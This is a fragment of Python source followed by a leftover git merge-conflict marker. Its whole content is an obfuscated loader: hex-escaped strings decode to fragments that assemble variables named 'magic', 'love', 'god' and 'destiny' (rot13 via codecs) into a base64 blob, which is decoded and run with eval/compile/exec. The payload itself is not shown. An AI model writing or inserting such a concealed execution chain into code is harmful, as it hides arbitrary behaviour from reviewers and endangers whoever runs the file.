trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
>>>>>>> c2ac216f6f8edbd2705cc45598b38290cacafb4e
